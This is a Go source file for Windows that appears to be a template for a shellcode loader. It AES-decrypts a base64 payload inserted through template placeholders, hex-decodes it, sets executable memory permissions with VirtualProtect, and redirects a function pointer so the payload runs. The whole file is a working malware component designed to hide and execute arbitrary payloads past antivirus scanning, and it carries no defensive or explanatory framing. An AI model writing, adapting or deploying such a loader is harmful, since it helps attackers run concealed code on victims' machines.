// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	kernel32dll        = syscall.NewLazyDLL("kernel32.dll")
	procVirtualProtect = kernel32dll.NewProc("VirtualProtect")
)

// Decrypt: Encrypted Text --> Base64 Decode --> Decrypt with IV and Key
func Decrypt(key []byte, encryptedText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(encryptedText)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// Using IV
	iv := ciphertext[:aes.BlockSize]

	// Checking BlockSize = IV
	if len(iv) != aes.BlockSize {
		panic("[Error] Ciphertext is too short!")
	}

	ciphertext = ciphertext[aes.BlockSize:]

	// Decryption Process
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return string(ciphertext)
}

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Execute(shellcode []byte) {
	f := func() {}

	// Change permission on f function ptr
	var oldPerms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldPerms)) {
		panic("[ERROR] Call to VirtualProtect failed!")
	}

	// Overwriting function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	// Change permissions on shellcode string data
	var oldShellcodePerms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldShellcodePerms)) {
		panic("[ERROR] Call to VirtualProtect failed!")
	}

	f()
}

func main() {
    encShellcode := "{{.Shellcode}}"
	key := []byte("{{.Key}}")

	// Decrypt base64/AES to original value
	decShellcode := Decrypt(key, encShellcode)

	sc_bin, err := hex.DecodeString(decShellcode)

	if err != nil {
		fmt.Printf("[ERROR] Error Decoding: %s\n", err)
		os.Exit(1)
	}

    Execute(sc_bin)
}